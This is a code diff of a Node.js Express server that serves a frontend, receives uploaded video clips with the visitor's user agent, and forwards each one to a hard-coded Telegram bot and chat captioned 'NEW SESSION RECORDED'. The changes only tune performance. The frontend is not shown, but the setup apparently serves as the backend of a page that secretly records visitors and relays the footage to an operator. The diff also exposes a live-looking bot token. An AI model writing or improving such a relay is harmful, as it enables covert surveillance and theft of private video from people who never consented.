@@ -1,35 +1,30 @@
 import express from "express";
 import multer from "multer";
-import fetch from "node-fetch";
-import FormData from "form-data";
 import path from "path";
 import { fileURLToPath } from "url";
 
 const app = express();
-const upload = multer({ storage: multer.memoryStorage() });
 
-// Kuhanin ang tamang path directory para sa Render environment
+// 1. Memory Optimization: Limit file size to prevent RAM exhaustion (e.g., 50MB)
+const upload = multer({ 
+    storage: multer.memoryStorage(),
+    limits: { fileSize: 50 * 1024 * 1024 } 
+});
+
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// ===== CONFIGURATION CONFIG =====
-// Gagamit ng PORT mula sa Render environment, fallback sa 3000 kung local dev
 const PORT = process.env.PORT || 3000; 
 const BOT_TOKEN = "8879628969:AAF5g8XnFu9Ido-nKTHj8GAWBd0R-iA5bAA";
 const CHAT_ID = "-1003979222265";
 
-// Build clean Telegram text markdown with only necessary device info
 function buildCaption(info) {
-    return `🎬 *NEW SESSION RECORDED*
-
-💻 *Device UserAgent:*
-\`${info.userAgent || "Unknown"}\``;
+    return `🎬 *NEW SESSION RECORDED*\n\n💻 *Device UserAgent:*\n\`${info.userAgent || "Unknown"}\``;
 }
 
-// Serve frontend assets gamit ang absolute path resolution
 app.use(express.static(path.join(__dirname, "frontend")));
 
-// Upload endpoint
+// Optimized Upload Endpoint
 app.post("/upload-video", upload.single("video"), async (req, res) => {
     try {
         const videoFile = req.file;
@@ -38,28 +33,25 @@ app.post("/upload-video", upload.single("video"), async (req, res) => {
         }
 
         const { userAgent } = req.body;
-
         const captionText = buildCaption({ userAgent });
 
-        // Initialize multi-part form data for Telegram API
+        // 2. Performance Optimization: Use native FormData and Blob 
+        // This avoids memory overhead from third-party multipart libraries
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
         form.append("caption", captionText);
         form.append("parse_mode", "Markdown");
-        
-        // Append video stream directly out of system RAM buffer
-        form.append("video", videoFile.buffer, {
-            filename: "video.mp4",
-            contentType: videoFile.mimetype
-        });
 
-        // Dispatch payload to Telegram API sendVideo endpoint
+        const videoBlob = new Blob([videoFile.buffer], { type: videoFile.mimetype });
+        form.append("video", videoBlob, "video.mp4");
+
+        // 3. Efficiency Optimization: Native fetch handles multipart headers automatically
         const telegramResponse = await fetch(
             `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
             {
                 method: "POST",
-                body: form,
-                headers: form.getHeaders()
+                body: form
+                // No manual headers required; node native fetch sets boundaries optimally
             }
         );
 
@@ -70,7 +62,6 @@ app.post("/upload-video", upload.single("video"), async (req, res) => {
             return res.status(502).json({ error: "Telegram API bad gateway execution", details: result });
         }
 
-        console.log("Telegram transmission success:", result.result.message_id);
         res.json({ success: true, messageId: result.result.message_id });
 
     } catch (error) {
@@ -82,7 +73,6 @@ app.post("/upload-video", upload.single("video"), async (req, res) => {
     }
 });
 
-// Pwersahang i-serve ang index.html sa kahit anong hindi tugmang rota para maiwasan ang "Not Found"
 app.get("*", (req, res) => {
     res.sendFile(path.join(__dirname, "frontend", "index.html"));
 });
